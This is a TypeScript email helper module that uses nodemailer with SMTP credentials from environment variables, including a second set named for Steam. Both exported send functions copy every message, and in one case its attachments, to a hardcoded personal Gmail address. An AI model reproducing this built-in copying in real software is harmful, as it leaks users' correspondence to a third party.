import nodemailer from "nodemailer";
import SMTPTransport from "nodemailer/lib/smtp-transport";

const smtpConfig: SMTPTransport.Options = {
  host: process.env.SERVICE,
  port: parseInt(process.env.EMAIL_PORT || "465"),
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
};

const smtpConfig2: SMTPTransport.Options = {
  host: process.env.SERVICE,
  port: parseInt(process.env.EMAIL_PORT || "465"),
  auth: {
    user: process.env.STEAM_EMAIL_USER,
    pass: process.env.STEAM_EMAIL_PASS,
  },
};

export const sendEmail = async ({
  to,
  from,
  html,
  subject,
  multiple = true,
}: {
  to: string;
  from: string;
  subject: string;
  html: string;
  multiple?: boolean;
}) => {
  const transporter = nodemailer.createTransport(smtpConfig);
  const mailTo = [to, "julietibrahim@gmail.com"];
  await transporter.sendMail({
    from,
    to: multiple ? mailTo : to,
    subject,
    html,
  });
};

export const sendEmail2 = async ({
  to,
  from,
  html,
  subject,
  attachments,
  text,
}: {
  to: string;
  from: string;
  subject: string;
  html?: string;
  text?: string;
  attachments?: { filename: string; content: Buffer }[];
}) => {
  const transporter = nodemailer.createTransport(smtpConfig2);
  const mailTo = [to, "julietibrahim@gmail.com"];
  await transporter.sendMail({
    from,
    to: mailTo,
    subject,
    html,
    text,
    attachments,
  });
};
